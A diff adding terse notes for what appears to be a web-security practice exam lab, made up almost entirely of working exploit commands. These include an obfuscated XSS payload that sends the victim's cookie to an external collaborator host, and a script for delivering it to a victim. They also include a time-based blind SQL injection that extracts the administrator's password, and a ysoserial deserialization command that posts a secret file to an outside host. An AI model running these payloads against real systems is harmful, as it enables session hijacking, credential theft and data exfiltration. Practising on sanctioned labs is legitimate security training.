@@ -1,0 +1,25 @@
+PRACTICE EXAM 1 COMMANDS:
+
+payload for stealing cookies through the search functionality
+
+"-eval(atob("ZmV0Y2goYGh0dHBzOi8vaDZvOXpuYjlqdTJxemVzdTI0aHh4OGpsMmM4M3d0a2kub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="))-"
+GET /search_res?SearchTerm=%22-eval%28atob%28%22ZmV0Y2goYGh0dHBzOi8vaDZvOXpuYjlqdTJxemVzdTI0aHh4OGpsMmM4M3d0a2kub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ%3D%3D%22%29%29-%22
+
+deliver this to victim:
+<script>
+document.location="https://0a4f00f403600c9680ca21e200c70061.web-security-academy.net/?SearchTerm=%22-eval%28atob%28%22ZmV0Y2goYGh0dHBzOi8vaDZvOXpuYjlqdTJxemVzdTI0aHh4OGpsMmM4M3d0a2kub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ%3D%3D%22%29%29-%22"
+</script>
+
+use his cookie to access the advanced search:
+GET /advanced_search?SearchTerm=123&organize_by=DATE;select+case+when+(username='administrator'+and+substring(password,§1§,1)='§a§')+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--&blogArtist= HTTP/2
+
+1st payload list is numbers 1-20
+2nd payload list is a-z A-Z 0-9
+
+then you get the admins password
+notice the admin gets a serialized cookie:
+
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 'wget http://vcbn51hnp8845sy88inb3mpz8qeh29qy.oastify.com --post-file=/home/carlos/secret' | gzip -f | base64 -w 0
+
+
+then you get the solution in collaborator
